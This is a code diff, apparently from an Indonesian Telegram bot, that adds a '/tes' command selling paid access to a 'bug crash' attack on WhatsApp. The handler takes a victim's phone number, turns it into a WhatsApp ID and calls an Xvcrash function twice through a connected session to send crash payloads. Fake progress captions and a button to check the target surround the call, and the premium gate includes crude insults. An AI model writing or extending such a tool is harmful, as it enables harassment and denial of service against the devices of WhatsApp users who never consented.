@@ -555,6 +555,109 @@ if (!premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) 
 let jedaXnish = 60 * 1000; 
 let lastExecutionTime = {};
 
+bot.onText(/\/tes (\d+)/, async (msg, match) => {
+   const chatId = msg.chat.id;
+  const senderId = msg.from.id;
+  const targetNumber = match[1];
+  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
+  const jid = `${formattedNumber}@s.whatsapp.net`;
+  const randomImage = getRandomImage();
+
+if (!premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date())) {
+  return bot.sendPhoto(chatId, randomImage, {
+    caption: "```\nBELI PREMIUM DULU SONO KONTOL\n\n#-Bangsat lu bukan premium user anjeng, beli dulu sana acces sama owner\n```",
+    parse_mode: "MarkdownV2",
+    reply_markup: {
+      inline_keyboard: [
+        [{ text: "📞 𝘉𝘶𝘺 𝘈𝘤𝘤𝘦𝘴", url: "https://t.me/VexxuzzZ" }],
+        [{ text: "𝘖𝘸𝘯𝘦𝘳", url: "https://t.me/VexxuzzZ" }, { text: "𝘐𝘯𝘧𝘰", url: "https://t.me/VexxuzzZ" }]
+      ]
+    }
+  });
+}
+
+const remainingTime = checkCooldown(msg.from.id);
+if (remainingTime > 0) {
+  return bot.sendMessage(chatId, `⏳ Tunggu ${Math.ceil(remainingTime / 60)} menit sebelum bisa pakai command ini lagi.`);
+}
+
+  try {
+    if (sessions.size === 0) {
+      return bot.sendMessage(
+        chatId,
+        "❌ Tidak ada bot WhatsApp yang terhubung. Silakan hubungkan bot terlebih dahulu dengan /addsender 62xxx"
+      );
+    }
+
+    // Kirim gambar + caption pertama
+    const sentMessage = await bot.sendPhoto(chatId, "https://files.catbox.moe/6ph0wo.jpg", {
+      caption: `
+\`\`\`
+#- 𝘉 𝘜 𝘎 - Ｘ C R A S H
+╰➤ Bug ini work di semua device dan berlangsung lama
+──────────────────────────
+ ▢ ᴛᴀʀɢᴇᴛ : ${formattedNumber}
+ ▢ 𝑺𝒕𝒂𝒕𝒖𝒔 : 🔄 Mengirim bug...
+ ▢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨 : [░░░░░░░░░░] 0%
+\`\`\`
+`, parse_mode: "Markdown"
+    });
+
+    // Progress bar bertahap
+    const progressStages = [
+      { text: "▢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨 : [█░░░░░░░░░] 10%", delay: 500 },
+      { text: "▢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨 : [███░░░░░░░] 30%", delay: 1000 },
+      { text: "▢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨 : [█████░░░░░] 50%", delay: 1500 },
+      { text: "▢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨 : [███████░░░] 70%", delay: 2000 },
+      { text: "▢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨 : [█████████░] 90%", delay: 2500 },
+      { text: "▢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨 : [██████████] 100%\n✅ 𝙎𝙪𝙘𝙘𝙚𝙨𝙨 𝙎𝙚𝙣𝙙𝙞𝙣𝙜 𝘽𝙪𝙜!", delay: 3000 }
+    ];
+
+    // Jalankan progres bertahap
+    for (const stage of progressStages) {
+      await new Promise(resolve => setTimeout(resolve, stage.delay));
+      await bot.editMessageCaption(`
+\`\`\`
+#- 𝘉 𝘜 𝘎 - Ｘ C R A S H
+╰➤ Bug ini work di semua device dan berlangsung lama
+──────────────────────────
+ ▢ ᴛᴀʀɢᴇᴛ : ${formattedNumber}
+ ▢ 𝑺𝒕𝒂𝒕𝒖𝒔 : ⏳ Sedang memproses...
+ ${stage.text}
+\`\`\`
+`, { chat_id: chatId, message_id: sentMessage.message_id, parse_mode: "Markdown" });
+    }
+
+    // Eksekusi bug setelah progres selesai
+    await console.log("\x1b[32m[PROCES MENGIRIM BUG]\x1b[0m TUNGGU HINGGA SELESAI");
+    await Xvcrash(sessions.values().next().value, jid);
+    await Xvcrash(sessions.values().next().value, jid);
+    await console.log("\x1b[32m[SUCCESS]\x1b[0m Bug berhasil dikirim! 🚀");
+
+    // Update ke sukses + tombol cek target
+    await bot.editMessageCaption(`
+\`\`\`
+#- 𝘉 𝘜 𝘎 - Ｘ Ｏ Ｐ Ｏ Ｗ Ｎ
+╰➤ Bug berhasil dikirim ke target!
+──────────────────────────
+ ▢ ᴛᴀʀɢᴇᴛ : ${formattedNumber}
+ ▢ 𝑺𝒕𝒂𝒕𝒖𝒔 : ✅ Sukses!
+ ▢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨 : [██████████] 100%
+\`\`\`
+`, {
+      chat_id: chatId,
+      message_id: sentMessage.message_id,
+      parse_mode: "Markdown",
+      reply_markup: {
+        inline_keyboard: [[{ text: "Cek Target", url: `https://wa.me/${formattedNumber}` }]]
+      }
+    });
+
+  } catch (error) {
+    bot.sendMessage(chatId, `❌ Gagal mengirim bug: ${error.message}`);
+  }
+});
+
 bot.onText(/\/setjeda (\d+)/, (msg, match) => {
   const chatId = msg.chat.id;
   const newDelay = parseInt(match[1]) * 1000; 
